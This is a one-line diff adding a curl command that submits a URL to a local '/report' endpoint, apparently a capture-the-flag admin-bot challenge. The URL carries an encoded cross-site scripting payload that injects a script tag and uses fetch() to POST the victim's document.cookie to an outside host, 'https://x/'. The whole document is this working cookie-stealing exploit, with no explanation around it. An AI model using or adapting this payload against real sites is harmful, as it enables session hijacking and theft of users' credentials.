@@ -1,0 +1,1 @@
+curl "http://localhost:5000/report" -XPOST --data 'url=http://127.0.0.1:5000/?auto_input=%3Cscript%20src=%22a/;fetch(`https://x/`,{method:`post`,body:`${document.cookie}`})//%22%20%3Cimg%26fulldisplay=1'
